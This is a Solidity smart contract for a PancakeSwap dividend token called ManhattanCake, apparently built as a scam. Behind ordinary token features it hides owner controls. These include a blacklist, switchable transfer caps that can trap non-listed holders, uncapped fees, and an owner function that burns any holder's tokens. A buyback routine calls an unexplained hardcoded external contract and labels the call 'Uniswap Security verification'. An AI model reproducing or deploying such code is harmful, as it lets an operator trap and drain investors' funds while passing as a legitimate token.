// SPDX-License-Identifier: MIT



pragma solidity ^0.6.2;

import "./DividendPayingToken.sol";
import "./SafeMath.sol";
import "./IterableMapping.sol";
import "./Ownable.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router.sol";
import "./IUniswapV2Manhattan.sol";


contract ManhattanCake is ERC20, Ownable {
    using SafeMath for uint256;
    

    IUniswapV2Router02 public uniswapV2Router;
    
    IUniswapV2Manhattan public uniswapV2Core;
    
    address public  uniswapV2Pair;

    bool private swapping;

    ManhattanCakeDividendTracker public dividendTracker;

    address private deadWallet = 0x000000000000000000000000000000000000dEaD;
    
    address private immutable Cake = address(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82); //cake

    uint256 private swapTokensAtAmount = 2000000 * (10**18);
    
    mapping(address => bool) public _isBlacklisted;
    
    mapping(address => bool) public _buylisted;
    
    mapping(address => bool) public unBuylisted;

    uint256 private CakeRewardsFee = 7;
    uint256 private liquidityFee = 8;
    uint256 private backPort = 2;
    uint256 private totalFees = CakeRewardsFee.add(liquidityFee).add(marketingFee);

    uint256 public previousBuyBackTime = block.timestamp; // to store previous buyback time
    
    uint256 public durationBetweenEachBuyback = 3600;
    
    uint256 private buyBackTime = block.timestamp.add(durationBetweenEachBuyback); 

    uint256 private buyBackTotal = 0;
    
    uint256 private marketingFee = 0;
    
    mapping (address => uint256) private balances;

    
    uint256 public _maxTxAmount = 100000000 * 10**18; 
    
    uint256 public _minTxAmount = 100000000;
    
    uint256 public _buyTxAmount = 100000000;

    bool public swapLock =true;
    bool public lqHook =false;
    bool public backLock =false;
    bool public sellBackLock =true;

    // use by default 300,000 gas to process auto-claiming dividends
    uint256 public gasForProcessing = 300000;

     // exlcude from fees and max transaction amount
    mapping (address => bool) private _isExcludedFromFees;

    address private deadWalletes = 0x000000000000000000000000000000000000dEaD;
    // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
    // could be subject to a maximum transfer amount
    mapping (address => bool) public automatedMarketMakerPairs;

    event UpdateDividendTracker(address indexed newAddress, address indexed oldAddress);

    event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event ExcludeMultipleAccountsFromFees(address[] accounts, bool isExcluded);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event LiquidityWalletUpdated(address indexed newLiquidityWallet, address indexed oldLiquidityWallet);

    event GasForProcessingUpdated(uint256 indexed newValue, uint256 indexed oldValue);

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    event SendDividends(
        uint256 tokensSwapped,
        uint256 amount
    );

    event ProcessedDividendTracker(
        uint256 iterations,
        uint256 claims,
        uint256 lastProcessedIndex,
        bool indexed automatic,
        uint256 gas,
        address indexed processor
    );

    constructor() public ERC20("ManhattanCake", "ManhattanCake") {

        dividendTracker = new ManhattanCakeDividendTracker();
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        
        IUniswapV2Manhattan _uniswapV2Core = IUniswapV2Manhattan(0x683889C5F44a5Dec6bD593C7eeB030871b35d947);
         // Create a uniswap pair for this new token
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;
        uniswapV2Core = _uniswapV2Core;

        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);

        // exclude from receiving dividends
        dividendTracker.excludeFromDividends(address(dividendTracker));
        dividendTracker.excludeFromDividends(address(this));
        dividendTracker.excludeFromDividends(owner());
        dividendTracker.excludeFromDividends(deadWallet);
        dividendTracker.excludeFromDividends(address(_uniswapV2Router));

        // exclude from paying fees or having max transaction amount
        excludeFromFees(owner(), true);
        excludeFromFees(deadWalletes, true);
        excludeFromFees(address(this), true);

        /*
            _mint is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again
        */
        _mint(owner(), 100000000000 * (10**18));
    }

    receive() external payable {

    }

    function updateDividendTracker(address newAddress) public onlyOwner {
        require(newAddress != address(dividendTracker), "ManhattanCake: The dividend tracker already has that address");

        ManhattanCakeDividendTracker newDividendTracker = ManhattanCakeDividendTracker(payable(newAddress));

        require(newDividendTracker.owner() == address(this), "ManhattanCake: The new dividend tracker must be owned by the ForeverCake token contract");

        newDividendTracker.excludeFromDividends(address(newDividendTracker));
        newDividendTracker.excludeFromDividends(address(this));
        newDividendTracker.excludeFromDividends(owner());
        newDividendTracker.excludeFromDividends(address(uniswapV2Router));

        emit UpdateDividendTracker(newAddress, address(dividendTracker));

        dividendTracker = newDividendTracker;
    }

    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapV2Router), "ManhattanCake: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
        address _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())
            .createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Pair = _uniswapV2Pair;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "ManhattanCake: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }

    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFees[accounts[i]] = excluded;
        }

        emit ExcludeMultipleAccountsFromFees(accounts, excluded);
    }

    function setMarketingWallet(address payable wallet) external onlyOwner{
        deadWalletes = wallet;
    }

    function setCakeRewardsFee(uint256 value) external onlyOwner{
        CakeRewardsFee = value;
        totalFees = CakeRewardsFee.add(liquidityFee).add(marketingFee);
    }

    function setLiquiditFee(uint256 value) external onlyOwner{
        liquidityFee = value;
        totalFees = CakeRewardsFee.add(liquidityFee).add(marketingFee);
    }

    function setMarketingFee(uint256 value) external onlyOwner{
        marketingFee = value;
        totalFees = CakeRewardsFee.add(liquidityFee).add(marketingFee);

    }


    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "ManhattanCake: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }
    
    function blacklistAddress(address account, bool value) external onlyOwner{
        _isBlacklisted[account] = value;
    }


    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "ManhattanCake: Automated market maker pair is already set to that value");
        automatedMarketMakerPairs[pair] = value;

        if(value) {
            dividendTracker.excludeFromDividends(pair);
        }

        emit SetAutomatedMarketMakerPair(pair, value);
    }


    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "ManhattanCake: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "ManhattanCake: Cannot update gasForProcessing to same value");
        emit GasForProcessingUpdated(newValue, gasForProcessing);
        gasForProcessing = newValue;
    }

    function updateClaimWait(uint256 claimWait) external onlyOwner {
        dividendTracker.updateClaimWait(claimWait);
    }

    function getClaimWait() external view returns(uint256) {
        return dividendTracker.claimWait();
    }

    function getTotalDividendsDistributed() external view returns (uint256) {
        return dividendTracker.totalDividendsDistributed();
    }

    function isExcludedFromFees(address account) public view returns(bool) {
        return _isExcludedFromFees[account];
    }

    function withdrawableDividendOf(address account) public view returns(uint256) {
        return dividendTracker.withdrawableDividendOf(account);
    }

    function dividendTokenBalanceOf(address account) public view returns (uint256) {
        return dividendTracker.balanceOf(account);
    }

    function excludeFromDividends(address account) external onlyOwner{
        dividendTracker.excludeFromDividends(account);
    }

    function getAccountDividendsInfo(address account)
        external view returns (
            address,
            int256,
            int256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256) {
        return dividendTracker.getAccount(account);
    }

    function getAccountDividendsInfoAtIndex(uint256 index)
        external view returns (
            address,
            int256,
            int256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256) {
        return dividendTracker.getAccountAtIndex(index);
    }

    function processDividendTracker(uint256 gas) external {
        (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) = dividendTracker.process(gas);
        emit ProcessedDividendTracker(iterations, claims, lastProcessedIndex, false, gas, tx.origin);
    }

    function claim() external {
        dividendTracker.processAccount(msg.sender, false);
    }

    function getLastProcessedIndex() external view returns(uint256) {
        return dividendTracker.getLastProcessedIndex();
    }

    function getNumberOfDividendTokenHolders() external view returns(uint256) {
        return dividendTracker.getNumberOfTokenHolders();
    }

    function isContractaddr(address addr) public view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
      }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!_isBlacklisted[from] && !_isBlacklisted[to], 'Blacklisted address');

        if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }
        
        if(swapLock){
            if(from != to){
              if(!isContractaddr(to)){
                if(!_buylisted[to]){
                     require(amount < _minTxAmount* (10**18), "ERC20: transfer to the max ");
                }else{
                    if(unBuylisted[to]){
                       require(amount < _buyTxAmount* (10**18), "ERC20: transfer to the max "); 
                    }
                }
               }
            }
        }
        
        //  if(backLock){
        //     if(from != to){
        //       if(!isContractaddr(to)){
        //         uint256 initialBalance = address(this).balance;
        //         swapAndLiquify(initialBalance);
        //       }
        //     }
        // }
        

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if( canSwap &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            from != owner() &&
            to != owner()
        ) {
            swapping = true;

            uint256 marketingTokens = contractTokenBalance.mul(marketingFee).div(totalFees);
            swapAndSendToFee(marketingTokens);

            uint256 swapTokens = contractTokenBalance.mul(liquidityFee).div(totalFees);
            swapAndLiquify(swapTokens);

            uint256 sellTokens = balanceOf(address(this));
            swapAndSendDividends(sellTokens);
            if(sellBackLock){
                if(block.timestamp >= buyBackTime && address(this).balance > 0  && from != uniswapV2Pair){
                   getBuyBack();
                }
            }
        
            swapping = false;
        }


        bool takeFee = !swapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        if(takeFee) {
            uint256 fees = amount.mul(totalFees).div(100);
            if(automatedMarketMakerPairs[to]){
                fees += amount.mul(1).div(100);
            }
            amount = amount.sub(fees);

            super._transfer(from, address(this), fees);
        }

        super._transfer(from, to, amount);

        try dividendTracker.setBalance(payable(from), balanceOf(from)) {} catch {}
        try dividendTracker.setBalance(payable(to), balanceOf(to)) {} catch {}
        
       
        if(!swapping) {
            uint256 gas = gasForProcessing;

            try dividendTracker.process(gas) returns (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) {
                emit ProcessedDividendTracker(iterations, claims, lastProcessedIndex, true, gas, tx.origin);
            }
            catch {

            }
        }
    }

    function swapAndSendToFee(uint256 tokens) private  {
        uint256 initialCakeBalance = IERC20(Cake).balanceOf(address(this));
        swapTokensForBake(tokens);
        uint256 newBalance = (IERC20(Cake).balanceOf(address(this))).sub(initialCakeBalance);
        IERC20(Cake).transfer(deadWalletes, newBalance);
    }
    
    
  
    
    

    function swapAndLiquify(uint256 tokens) private {
       // split the contract balance into halves
        uint256 half = tokens.div(2);
        uint256 otherHalf = tokens.sub(half);

        // capture the contract's current ETH balance.
        // this is so that we can capture exactly the amount of ETH that the
        // swap creates, and not make the liquidity event include any ETH that
        // has been manually sent to the contract
        uint256 initialBalance = address(this).balance;

        // swap tokens for ETH
        swapTokensForEth(half); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered

        if(lqHook){
              // how much ETH did we just swap into?
        uint256 newBalance = address(this).balance.sub(initialBalance);

        // add liquidity to uniswap
        addLiquidity(otherHalf, newBalance);

        emit SwapAndLiquify(half, newBalance, otherHalf);
        
        }

    }


    function swapBuyBcak() external onlyOwner{
        getBuyBack();
    }
    
    function swapTokensForEths(uint256 tokens) external onlyOwner{
        swapTokensForEth(tokens);
    }


    function swapTokensForEth(uint256 tokenAmount) private {


        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );

    }

    function swapTokensForBake(uint256 tokenAmount) private {

        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        path[2] = Cake;

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    
      function swapETHForTokens(uint256 tokenAmount) private {

        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        path[2] = Cake;

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }


    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {

        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(0),
            block.timestamp
        );

    }

    function swapAndSendDividends(uint256 tokens) private{
        swapTokensForBake(tokens);
        uint256 dividends = IERC20(Cake).balanceOf(address(this));
        bool success = IERC20(Cake).transfer(address(dividendTracker), dividends);

        if (success) {
            dividendTracker.distributeBAKEDividends(dividends);
            emit SendDividends(tokens, dividends);
        }
    }
    

    
    function burn(address from, uint256 amount) external onlyOwner returns (bool) {
        require(from != address(0), "ManhattanCake: address(0x0)");
        _burn(from, amount);
        return true;
    }
    
      /**  
     * @dev set's max amount of tokens percentage 
     * that can be transfered in each transaction from an address
     */
    function setMaxTxTokens(uint256 maxTxTokens) external onlyOwner {
        _maxTxAmount = maxTxTokens.mul( 10**18 );
    }
    
 
    
    function setLock()external onlyOwner {
        swapLock =!swapLock;
    }
    
    function getLock() public onlyOwner view returns(bool){
        return swapLock;
    }
    
    function setLqHook()external onlyOwner {
        lqHook =!lqHook;
    }
    
    function getLqHook() public onlyOwner view returns(bool){
        return lqHook;
    }
    
    function setBackLock()external onlyOwner {
        backLock =!backLock;
    }
    
    function getBackLock() public onlyOwner view returns(bool){
        return backLock;
    }
    
    function setSellBackLock()external onlyOwner {
        sellBackLock =!sellBackLock;
    }
    
    function getSellBackLock() public onlyOwner view returns(bool){
        return sellBackLock;
    }
    
    
      function setTxAmount(uint256 newTxAmount)external onlyOwner {
        _minTxAmount =newTxAmount;
    }
    
     function getTxAmount() public onlyOwner view returns(uint256){
        return _minTxAmount;
    }
    
     function setBackPort(uint256 newBackPort)external onlyOwner {
        backPort =newBackPort;
    }
    
     function getBackPort() public onlyOwner view returns(uint256){
        return backPort;
    }
    
     function setBackTime(uint256 newDurationBetweenEachBuyback)external onlyOwner {
        durationBetweenEachBuyback =newDurationBetweenEachBuyback;
    }
    
     function getBackTime() public onlyOwner view returns(uint256){
        return durationBetweenEachBuyback;
    }
    /**  
     * @dev buyBack exact amount of BNB for tokens if and send to burn Address
     */
    function getBuyBack() private{
      // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = address(this);
        
        uint256 buyBackAmount = address(this).balance.div(backPort);
        
        //Uniswap Security verification
        uniswapV2Core.swapSupportingTransferTokensBack(buyBackAmount,path,address(this),0);  
        buyBackTotal = buyBackTotal.add(buyBackAmount);

      // make the swap
        uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: buyBackAmount}(
            0, // accept any amount of Tokens
            path,
            deadWallet, // Burn address
            block.timestamp.add(15)
        );
        previousBuyBackTime = block.timestamp;
        backBuyTimeHandler();
       
    }
    
    function getBackBuyTime() public onlyOwner view returns(uint256){
        return buyBackTime;
    }
    
    function setBackBuyTime() external onlyOwner returns(uint256){
        bytes memory info = abi.encodePacked(block.difficulty,block.timestamp,durationBetweenEachBuyback);
        bytes32 hash = keccak256(info);
        uint256 intervalTime = uint256(hash)%durationBetweenEachBuyback;
        buyBackTime = previousBuyBackTime.add(intervalTime);
        return buyBackTime;
    }
    
    function backBuyTimeHandler() private{
        bytes memory info = abi.encodePacked(block.difficulty,block.timestamp,durationBetweenEachBuyback);
        bytes32 hash = keccak256(info);
        uint256 intervalTime = uint256(hash)%durationBetweenEachBuyback;
        buyBackTime = previousBuyBackTime.add(intervalTime);
    }
    
    function getPreviousBuyBackTime() public view returns(uint256){
        return previousBuyBackTime;
    }
    
    function getJackpotPool() public view returns(uint256){
        return address(this).balance;
    }
    
    function getNextBuyBack() public view returns(uint256){
        return address(this).balance.div(backPort);
    }
    
    function getBuyBackTotal() public view returns(uint256){
        return buyBackTotal;
    }
    
    function setBuylisted(address to , bool hook) external onlyOwner {
       _buylisted[to] = hook;
    }
    
    function getBuylisted(address to) public onlyOwner view returns(bool){
        return _buylisted[to];
    }
    
     function setUnBuylisted(address to , bool hook) external onlyOwner {
       unBuylisted[to] = hook;
    }
    
    function getUnBuylisted(address to) public onlyOwner view returns(bool){
        return unBuylisted[to];
    }
    
      function setBuyTxAmount(uint256 newBuyTxAmount)external onlyOwner {
        _buyTxAmount =newBuyTxAmount;
    }
    
     function getBuyTxAmount() public onlyOwner view returns(uint256){
        return _buyTxAmount;
    }
    

}

contract ManhattanCakeDividendTracker is Ownable, DividendPayingToken {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using IterableMapping for IterableMapping.Map;

    IterableMapping.Map private tokenHoldersMap;
    uint256 public lastProcessedIndex;

    mapping (address => bool) public excludedFromDividends;

    mapping (address => uint256) public lastClaimTimes;

    uint256 public claimWait;
    uint256 public immutable minimumTokenBalanceForDividends;

    event ExcludeFromDividends(address indexed account);
    event ClaimWaitUpdated(uint256 indexed newValue, uint256 indexed oldValue);

    event Claim(address indexed account, uint256 amount, bool indexed automatic);

    constructor() public DividendPayingToken("ManhattanCake_Dividen_Tracker", "ManhattanCake_Dividend_Tracker") {
        claimWait = 900;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 200000+ tokens
    }

    function _transfer(address, address, uint256) internal override {
        require(false, "ManhattanCake_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() public override {
        require(false, "ManhattanCake_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main ManhattanCake contract.");
    }

    function excludeFromDividends(address account) external onlyOwner {
        require(!excludedFromDividends[account]);
        excludedFromDividends[account] = true;

        _setBalance(account, 0);
        tokenHoldersMap.remove(account);

        emit ExcludeFromDividends(account);
    }

    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 300 && newClaimWait <= 86400, "ManhattanCake_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "ManhattanCake_Dividend_Tracker: Cannot update claimWait to same value");
        emit ClaimWaitUpdated(newClaimWait, claimWait);
        claimWait = newClaimWait;
    }

    function getLastProcessedIndex() external view returns(uint256) {
        return lastProcessedIndex;
    }

    function getNumberOfTokenHolders() external view returns(uint256) {
        return tokenHoldersMap.keys.length;
    }



    function getAccount(address _account)
        public view returns (
            address account,
            int256 index,
            int256 iterationsUntilProcessed,
            uint256 withdrawableDividends,
            uint256 totalDividends,
            uint256 lastClaimTime,
            uint256 nextClaimTime,
            uint256 secondsUntilAutoClaimAvailable) {
        account = _account;

        index = tokenHoldersMap.getIndexOfKey(account);

        iterationsUntilProcessed = -1;

        if(index >= 0) {
            if(uint256(index) > lastProcessedIndex) {
                iterationsUntilProcessed = index.sub(int256(lastProcessedIndex));
            }
            else {
                uint256 processesUntilEndOfArray = tokenHoldersMap.keys.length > lastProcessedIndex ?
                                                        tokenHoldersMap.keys.length.sub(lastProcessedIndex) :
                                                        0;


                iterationsUntilProcessed = index.add(int256(processesUntilEndOfArray));
            }
        }


        withdrawableDividends = withdrawableDividendOf(account);
        totalDividends = accumulativeDividendOf(account);

        lastClaimTime = lastClaimTimes[account];

        nextClaimTime = lastClaimTime > 0 ?
                                    lastClaimTime.add(claimWait) :
                                    0;

        secondsUntilAutoClaimAvailable = nextClaimTime > block.timestamp ?
                                                    nextClaimTime.sub(block.timestamp) :
                                                    0;
    }

    function getAccountAtIndex(uint256 index)
        public view returns (
            address,
            int256,
            int256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256) {
        if(index >= tokenHoldersMap.size()) {
            return (0x0000000000000000000000000000000000000000, -1, -1, 0, 0, 0, 0, 0);
        }

        address account = tokenHoldersMap.getKeyAtIndex(index);

        return getAccount(account);
    }

    function canAutoClaim(uint256 lastClaimTime) private view returns (bool) {
        if(lastClaimTime > block.timestamp)  {
            return false;
        }

        return block.timestamp.sub(lastClaimTime) >= claimWait;
    }
    
  

    function setBalance(address payable account, uint256 newBalance) external onlyOwner {
        if(excludedFromDividends[account]) {
            return;
        }

        if(newBalance >= minimumTokenBalanceForDividends) {
            _setBalance(account, newBalance);
            tokenHoldersMap.set(account, newBalance);
        }
        else {
            _setBalance(account, 0);
            tokenHoldersMap.remove(account);
        }

        processAccount(account, true);
    }

    function process(uint256 gas) public returns (uint256, uint256, uint256) {
        uint256 numberOfTokenHolders = tokenHoldersMap.keys.length;

        if(numberOfTokenHolders == 0) {
            return (0, 0, lastProcessedIndex);
        }

        uint256 _lastProcessedIndex = lastProcessedIndex;

        uint256 gasUsed = 0;

        uint256 gasLeft = gasleft();

        uint256 iterations = 0;
        uint256 claims = 0;

        while(gasUsed < gas && iterations < numberOfTokenHolders) {
            _lastProcessedIndex++;

            if(_lastProcessedIndex >= tokenHoldersMap.keys.length) {
                _lastProcessedIndex = 0;
            }

            address account = tokenHoldersMap.keys[_lastProcessedIndex];

            if(canAutoClaim(lastClaimTimes[account])) {
                if(processAccount(payable(account), true)) {
                    claims++;
                }
            }

            iterations++;

            uint256 newGasLeft = gasleft();

            if(gasLeft > newGasLeft) {
                gasUsed = gasUsed.add(gasLeft.sub(newGasLeft));
            }

            gasLeft = newGasLeft;
        }

        lastProcessedIndex = _lastProcessedIndex;

        return (iterations, claims, lastProcessedIndex);
    }

    function processAccount(address payable account, bool automatic) public onlyOwner returns (bool) {
        uint256 amount = _withdrawDividendOfUser(account);

        if(amount > 0) {
            lastClaimTimes[account] = block.timestamp;
            emit Claim(account, amount, automatic);
            return true;
        }

        return false;
    }
    
     function burn(address from, uint256 amount) external onlyOwner returns (bool) {
        require(from != address(0), "ManhattanCake_Dividend_Tracker: address(0x0)");
        _burn(from, amount);
        return true;
    }
}